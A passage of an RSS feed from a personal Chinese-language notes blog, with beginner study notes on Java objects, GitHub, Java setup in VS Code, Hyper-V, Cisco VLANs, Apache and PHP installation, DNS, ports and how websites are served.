对象可以理解为类中的一个元素，比如利用 person 这个人物类 new 一个“小明”，这个小明，就是一个具体的东西。
赋予这个小明一些属性，比如眼睛，鼻子，身高，这就是这个对象的属性。
赋予小明会编程、会跳舞唱歌的能力，这些就是这个对象的方法，你可以利用（调用）这些方法，让小明这个对象帮你写代码、唱首歌或跳支舞。
至于封装，我的理解是将内部的代码封装起来，然后提供一个接口供我们访问。比如电脑主机的开机键就是一个接口，我们点击开机键，就是调用这个电脑的一个接口，至于开机的内部过程或操作细节由电脑自行完成，我们无法干涉。
至于继承，还不知道。
void 的作用 void 表示一个方法中没有 return 任何数据类型，如果方法中 return 了某种数据类型，那么 void 会被替换为这种数据类型。
void Show1() {  int a = 123; }  int Show2() {  int a = 123;  return a; } public、protected、default（什么都不写）、private，表示访问控制的权限
private void Show1() {  int a = 123; }  // 相当于 default int Show2() int Show2() {  int a = 123;  return a; } </description>
    </item>
    
    <item>
      <title>Pull Requests</title>
      <link>https://note.yxzi.xyz/note/technology/git/github/pull-requests/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/github/pull-requests/</guid>
      <description>Pull Requests 简单来说就是：我改进了你的代码，你拉回去看看吧
当你想改进一个别人的项目 ，或想为别人的项目做贡献时，你将要走以下几个流程
 Fork 别人的仓库，相当于拷贝一份，毕竟不可能有人让你直接修改他的原仓库的。 将拷贝过来的仓库clone到本地分支，做一些修复，比如git clone git@github.com:YxzRainy/YxzRainy.github.io.git。 改进完成后，你希望仓库所有者接受你的修改，那么你需要在 Github 上创建一个Pull Request给原仓库所有者，意思是请求原仓库所有者合并你的分支。 原仓库所有者审查你做的这些修复后，如果它同意的话，就会将你做的修改合并到他自己的项目中，这样你就为他的这个项目做了贡献。 到这一步，整个Pull Request的过程就结束了。  </description>
    </item>
    
    <item>
      <title>Repository</title>
      <link>https://note.yxzi.xyz/note/technology/git/github/repository/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/github/repository/</guid>
      <description>Repository 一个在 GitHub 的 repository 的地址路径一般由 **GitHub 的域名 + 仓库主人 + 仓库本身的名字 **组成，并且你可以通过这个地址访问一个已存在的公开库 。比如 https://github.com/YxzRainy/YxzRainy.github.io
在这个仓库中，你可以上传文件或添加文件，并且可以直接编辑部分文档文件，比如 html、txt 等等，当你每次对这个仓库中的内容进行修改时，你都可以提交修改信息，比如你这次对文件做了哪些修改等等，这类似与备注。</description>
    </item>
    
    <item>
      <title>Vs Code 配置 Java</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/vs-code-%E9%85%8D%E7%BD%AE-java/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/vs-code-%E9%85%8D%E7%BD%AE-java/</guid>
      <description>Vs Code 配置 Java 安装 vscode 安装 JDK 配置系统环境变量 打开系统系统环境变量配置界面   右击此电脑
  属性
  高级系统设置
  高级选项卡
  环境变量
  系统变量
  新建 JAVA_HOME 变量  变量名：JAVA_HOME。 值为：Java JDK 的安装路径。 确定  找到已存在的名为 Path 的变量  编辑 新建 输入：%JAVA_HOME%\jre\bin，确定 再新建，输入：%JAVA_HOME%\bin，确定 保存即可  新建 Classpath 变量   变量名：Classpath，
  值为：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;
  测试环境配置是否成功 快捷键 Win + R，搜索 cmd 并 Enter，然后在命令行输入java以及javac.
安装 vs code 扩展 java extension pack。</description>
    </item>
    
    <item>
      <title>安装 Hyper V</title>
      <link>https://note.yxzi.xyz/note/technology/windows-server/%E5%AE%89%E8%A3%85-hyper-v/</link>
      <pubDate>Sat, 02 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/windows-server/%E5%AE%89%E8%A3%85-hyper-v/</guid>
      <description>安装 Hyper V 安装 hyper v
在第一台上链接第二台虚拟计算机
启动 nat 模式 8
关闭两台计算机的防火墙，更改高级设置，启用网络网络发现，关闭密码共享
第一太 ping 第二台计算机的 ip 地址，成功即可
查询
开远程权限
新建虚拟机
位置和名称
指定代数，32 位系统选第一代 64 位系统选第二代
分配内存，1024
网络连接，intel 8257
大小，25gb
以后安装操作系统
最后链接虚拟机
右击虚拟机
检查点
将虚拟机导出到文件夹，到处后就可以在操作界面进行导入虚拟机，创建新标识符
安装操作系统
文件，设置 ，固件，dvd 放到第一个，安装完成后，关机再将硬盘放到第一个。
关机，添加新硬盘，开机，计算机管理，磁盘管理，新建一个本地磁盘。
hyper v 设置，实时迁移，启用迁移
移动虚拟机，将虚拟机移动到新建的磁盘上即可
允许链接共享
在 hyper v 上新建磁盘，固定大小动态扩展，下一步，完成</description>
    </item>
    
    <item>
      <title>Cisco Vlan</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/vlan/</link>
      <pubDate>Sun, 12 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/vlan/</guid>
      <description>Vlan 重命名 Vlan enable configure terminal vlan 10 name MyVlan 删除 Vlan 分配 enable configure terminal interface f 0/18 no switchport access vlan 删除 Vlan no vlan 20 配置 Vlan 的 IP enable configure terminal interface vlan 1 ip address 192.168.10.1 255.255.255.0 </description>
    </item>
    
    <item>
      <title>PHP</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/php/</link>
      <pubDate>Sat, 30 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/php/</guid>
      <description>PHP PHP 是一种运行在服务器端的脚本语言。
PHP Hyper text Pxeprosessor, php. 超文本预处理器，底层使用 C 语言。
所支持的数据库有：Sqlservex、Mysql、Oracle、Access</description>
    </item>
    
    <item>
      <title>安装 Apache</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E5%AE%89%E8%A3%85-apache/</link>
      <pubDate>Thu, 07 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E5%AE%89%E8%A3%85-apache/</guid>
      <description>安装 Apache 官方下载地址Apache 进不去的话，就挂个 VPN，下载好后解压，我们会得到一个名为 Apache24 的文件夹，我们先将这个文件夹放到你想要放置的目录，我这里是D:\AppInstallPath\Apache24.
目录文件解析 bin 和 cgi -bin 文件夹是 windows 下的一些可执行文件。
conf 文件夹是 Apache 的配置文件目录。
error 文件夹是 Apache 的错误日志。
htdoce 文件夹是 Apache 的默认主机地址（网站的根目录文件，默认为 index）。
modules 文件夹是 Apache 的模块，Apache 的所有功能都是模块化的，你想要什么功能，就可以在配置文件中去加载对应功能的模块（so 后缀的文件）
bin 文件夹解析 ab.exe 是提供压力测试（当很多人访问你的网站时，你的网站是否能承载）的一个程序。
ApacheMonitor.exe 是管理右下角最小化的图标的。
httpd.exe 很重要。
conf 文件夹解析 httpd.conf 是主配置文件。
extra 文件夹中都是子配置文件（比如 httpd-vhosts.conf），当我们需要用这些子配置文件的时候，我们需要到主配置中文件中去加载这些子配置文件。
Httpd.exe 代表着服务器的进程，它运行之后，服务器才能运行。</description>
    </item>
    
    <item>
      <title>网站访问流程</title>
      <link>https://note.yxzi.xyz/note/technology/internet/%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E6%B5%81%E7%A8%8B/</link>
      <pubDate>Wed, 06 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E6%B5%81%E7%A8%8B/</guid>
      <description>网站访问流程 静态网站  通过电脑打开浏览器输入 URL（资源的绝对路径），比如https://yxzi.xyz/:80/index.html DNS 服务器，先找本地 DNS（本地 hosts 文件），再找网络 DNS ，然后将域名（https://yxzi.xyz/）解析为 IP（192.168.1.0:80/index.html），最后将解析出来的 IP 返回给浏览器。 浏览器通过 IP（192.168.1.0:80/index.html）找到服务器， 再通过端口（80）找到服务器上的服务软件 Apache。 通过 Apache，就可以得到 一个 URI（资源都相对路径），Apache 根据这个 URI（/index.html），即可获取到服务器上文件名为 index.html 的文件。 Apache 会读取这个文件中的数据，并将最终结果返回给浏览器，反之，如果服务器上的文件不存在，那么浏览器会返回给浏览器一个错误，比如 404（链接所指向的网页不存在） 错误。 浏览器得到 Apache 返回的数据之后，它会解析这些数据，并将这些数据以某种方式呈现给用户。  动态网站  通过电脑打开浏览器输入 URL（资源的绝对路径），比如https://yxzi.xyz/:80/index.pnh DNS 服务器，先找本地 DNS（本地 hosts 文件），再找网络 DNS ，然后将域名（https://yxzi.xyz/）解析为 IP（192.168.1.0:80/index.php），最后将解析出来的 IP 返回给浏览器。 浏览器通过 IP（192.168.1.0:80/index.php）找到服务器， 再通过端口（80）找到服务器上的服务软件 Apache Apache 就可以得到 一个 URI（资源都相对路径），Apache 根据这个 URI（/index.php），即可获取到服务器上文件名为 index.php 的文件。 但又因为网站是动态的，所以 Apache 是无法识别后缀为 PHP 的文件的，因此在这里需要一个叫 PHP 引擎的东西，Apache 将 这个 PHP 文件交给 PHP 引擎，PHP 引擎读取 PHP 文件之后，需要将这个文件解析为 html 文件 ，注意，这时的 PHP 引擎可能会去寻找数据库，并对数据库进行一些操作（读取、放入、修改数据库等等）。最后，PHP 引擎会将解析后的 HTML 数据（PHP 文件中的数据和数据库中的数据），全部返回给 Apache。 Apache 会读取 PHP 引擎返回的内容，并将最终结果返回给浏览器，反之，如果服务器上的文件不存在，那么浏览器会返回给浏览器一个错误，比如 404（链接所指向的网页不存在） 错误。 浏览器得到 Apache 返回的数据之后，它会解析这些数据，并将这些数据以某种方式呈现给用户。  </description>
    </item>
    
    <item>
      <title>DNS 和端口</title>
      <link>https://note.yxzi.xyz/note/technology/internet/dns-%E5%92%8C%E7%AB%AF%E5%8F%A3/</link>
      <pubDate>Mon, 04 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/dns-%E5%92%8C%E7%AB%AF%E5%8F%A3/</guid>
      <description>DNS 和端口 DNS DNS 是互联网的一项服务，它作为将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。
简单的讲 DNS 就是翻译官，比如它会将http://www.baidu.com翻译成220.181.111.188让机器理解。
DNS 有什么用 DNS 是用来做域名解析的，它会在你上网输入网址后，把它转换成 IP，然后去访问这个 IP 所指定的服务器，没有它，你想上百度就要记住百度的 IP，上 163 就要记住 163 的 IP，有了 DNS 的处理，你只需要记住对应网站的域名（网址），比如https://yxzi.xyz/。
DNS 是一个按层次结构排列的分布式系统，由许多 DNS 服务器组成。DNS 服务器是注册加入 DNS 的任何计算机。它具有域名和 IP 地址的索引，并且在请求时，它可以告诉你与域名关联的当前 IP 地址。
如果它不知道，那么它将尝试从其他 DNS 服务器中找出。
因此，当您在浏览器中键入域名时，浏览器会询问 DNS 服务器该域的 IP 地址是什么，DNS 服务器会尝试告诉你。
端口 简单来说：
 在一台计算机上，端口用来指定你想要访问这台物理设备上的哪个程序。
 IP 能锁定一台物理机器，对应着一张网卡，网卡会接收外界发来的数据包。但是问题来了，网卡给程序提供了接口，你监听一下我，要是有消息来了，我就转发给你，这样应用程序就能收到数据了。
但是问题来了，程序 A 和程序 B 都需要监听网卡接发数据，网卡说那我把接到的数据都发给你两，你们自己看着办吧。
好，小 A 小 B 都接收了。
但是又来了 CDEF&amp;hellip;&amp;hellip;，不行了，每个包都被发到了所有应用程序，每个应用程序都累得不行，最终垮了。
好，那网卡说我给你们加个表示吧，我们之间可以用一个号码来作为标识，我和小 A 之间就用 1 来标识，
如果外界发给 1 号标识的数据我就转发给你，你监听我的时候得告诉我你监听的是 1，我就转发 1 的数据包给你。</description>
    </item>
    
    <item>
      <title>IP 和域名</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ip-%E5%92%8C%E5%9F%9F%E5%90%8D/</link>
      <pubDate>Mon, 04 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ip-%E5%92%8C%E5%9F%9F%E5%90%8D/</guid>
      <description>IP 和域名 IP IP 具有唯一性，像人的身份证一样，是唯一的。
通俗地讲就是互联网世界的门牌号，通过 IP 地址就可以准确无误的找到某台计算机的位置，它具有唯一性，所以当我们访问某个 IP 的时候才不会出现错误，他就像我们的身份证号码那样独一无二，我们可以和别人同名，但是绝不可能和别人有同样的身份证号码。
首先要确定你的 IP 地址是否是以 192.168 开头，如果是这个地址的话，不需要担心。这是内网的 IP 地址，在外网是无法直接访问的。如果不是内网的地址，有可能会遭到黑客的攻击。这需要一定的专业技术，普通人很难进行攻击，而且你的电脑应该需要有很强的利用价值，才会让人费时费力对你发起攻击之心，所以知道你 IP 对于大多数人来说不能对你做什么。
域名 IP 不方便我们记忆，而域名，则是为了我们更好的记忆某一个网站的地址。
域名（Domain Name）是由一串字符组成的，它指向某一个具体的 IP 地址。</description>
    </item>
    
    <item>
      <title>服务器</title>
      <link>https://note.yxzi.xyz/note/technology/internet/%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
      <pubDate>Mon, 04 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
      <description>服务器 在网络环境下，根据服务器提供的服务类型不同，分为文件服务器，数据库服务器，应 用程序服务器，WEB 服务器等。
一台个人计算机也可以成为一台服务器，只要这台计算机可以提供服务，那么，如何让这台计算机提供服务呢？
只需要在这台计算机上安装可以提供服务的软件（服务软件）。
比如一台 Web 服务器，它如果要提供 Web 服务（网站访问），就需要安装 Web 服务软件，Apache，Tomcat， Iis 等等
服务器是网站的灵魂，是打开网站的必要载体，没有服务器的网站用户无法浏览。服务器就像一块敲门砖，就算网站在搜索引擎里的排名再好，网站打不开，用户无法浏览，网站就没有用户体验可言，网站能被打开是第一个重点。
提到服务器对于电脑爱好者来说一定不陌生，一般我们很难看到真正的服务器，因为服务器一般均放置在机房重点，闲人一般均是免进的，所以说起服务器，好多未接触的朋友都觉的很陌生，介于此，斯百德就为不明白服务器是什么的小伙伴们，揭开服务器神秘的面纱。
其实服务器的模样就和电脑的主机很相似，但是服务器是网站的灵魂，是打开网站的必要载体，没有服务器的网站用户无法浏览。服务器就像一块敲门砖，就算网站在搜索引擎里的排名再好，网站打不开，用户无法浏览，网站就没有用户体验可言，网站能被打开是第一个重点。比如我们每天浏览的网站，其实数据均在服务器，服务器一般都在一些 IDC 数据中心机房以及电信等网络大厦里面。
服务器，也称伺服器。服务器是网络环境中的高性能计算机，它侦听网络上的其他计算机（客户机）提交的服务请求，并提供相应的服务，为此，服务器必须具有承担服务并且保障服务的能力。我们这里提到的服务器，主要是指的 Web 服务器，我们也称之为专用服务器，是专为网站业务应用的服务器，这种服务器可以向发出请求的浏览器提供文档的程序。Web 服务器也是一种被动的程序，只有当服务器接收到浏览器发出的请求时，服务器才会响应。
由于Web 服务器是一种被动的程序，所以不同类型的网站对 Web 服务器的要求差别很大。企业网站和个人网站一般都是展示型网站，所以他们对服务器的性能要求一般都不高。电子商务型网站以及门户型等网站一般访问量用户比较大，这些大型网站对服务器的需要则较高。
目前，用户使用最多的 web 服务器软件有两个：微软的信息服务器（iis）和 Apache。而架设 Web 服务器比较常见的操作系统有 Windows，Linux 和 Unix。Linux 的安全性在这三个系统中最高，同时可以支持多个硬件平台，而且其是开源软件，市场价格更低，甚至用户可以下载免费的代码来搭建 Web 服务器。Web 服务器的操作更简单，性能更优越，目前使用率非常的高，Unix 则比较小众！</description>
    </item>
    
    <item>
      <title>静态网站和动态网站</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99%E5%92%8C%E5%8A%A8%E6%80%81%E7%BD%91%E7%AB%99/</link>
      <pubDate>Mon, 04 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99%E5%92%8C%E5%8A%A8%E6%80%81%E7%BD%91%E7%AB%99/</guid>
      <description>静态网站和动态网站 静态网站的特点  网页内容一经发布到网站服务器上，无论是否有用户访问，每个静态网页的内容都是保存在网站服务器上的,也就是说,静态网页是实实在在保存在服务器上的文件，每个网页都是一个独立的文件。 静态网页的内容相对稳定，因此容易被搜索引擎检索。 静态网页没有数据库的支持，在网站制作和维护方面工作量较大，因此当网站信息量很大时完全依靠静态网页制作方式比较困难。 静态网页的交互性较差，在功能方面有较大的限制，当我们要修改网页上文件时，需要将修改后的文件覆盖服务器上的源文件。  动态网站的特点  交互性强，网页会根据用户的要求和选择而动态地改变和响应，网页上的数据都是从数据库中获取的，并且用户的操作，也可以对网页上的数据进行实时的更新。 自动更新，即无须手动更新 HTmL 文档,便会自动生成新页面，可以大大节省工作量。 因时因人而变，在不同时间、不同用户访问用一个网址时，会出现不同页面。 在动态网页的网址中有一个标志性的符号“?”。  </description>
    </item>
    
    <item>
      <title>PHP 函数</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E5%87%BD%E6%95%B0/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E5%87%BD%E6%95%B0/</guid>
      <description>函数 形参默认值 定义函数时，指定形参的默认值。这个默认值会在调用该函数且并未传入实参的时候，当作该函数的默认实参传入。
function fun($a = 1) {  echo $a; } fun(); 可变函数 将定义好的函数名赋值给一个变量，然后通过这个变量来调用。
function sysFun($fun, $num) {  $num = $num + 10;  // 函数调用  return $fun($num); }  function userFun($num) {  return $num * $num * $num * $num; } echo sysFun(&amp;#39;userFun&amp;#39;, 10); </description>
    </item>
    
    <item>
      <title>PHP 操作数据库</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93/</guid>
      <description>操作数据库 // 链接数据库 $link = mysqli_connect(&amp;#39;localhost&amp;#39;, &amp;#39;root&amp;#39;, &amp;#39;123456&amp;#39;, &amp;#39;my_shop&amp;#39;, &amp;#39;3306&amp;#39;); if (!$link) {  exit(&amp;#39;数据库链接失败&amp;#39;); }  // 对数据库进行一次查询 $res = mysqli_query($link, &amp;#39;select * from hr_goods&amp;#39;);  // 获取查询结果中的所有字段，每个字段都是一个数组 while ($row = mysqli_fetch_array($res)) {  echo $row[1] . &amp;#39;、&amp;#39;; }  </description>
    </item>
    
  </channel>
</rss>
